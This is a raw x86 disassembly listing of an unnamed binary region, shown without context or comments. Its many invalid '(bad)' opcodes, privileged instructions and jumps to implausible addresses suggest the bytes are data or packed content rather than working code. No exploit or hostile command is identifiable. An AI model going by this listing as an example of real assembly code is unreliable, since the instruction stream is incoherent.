  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
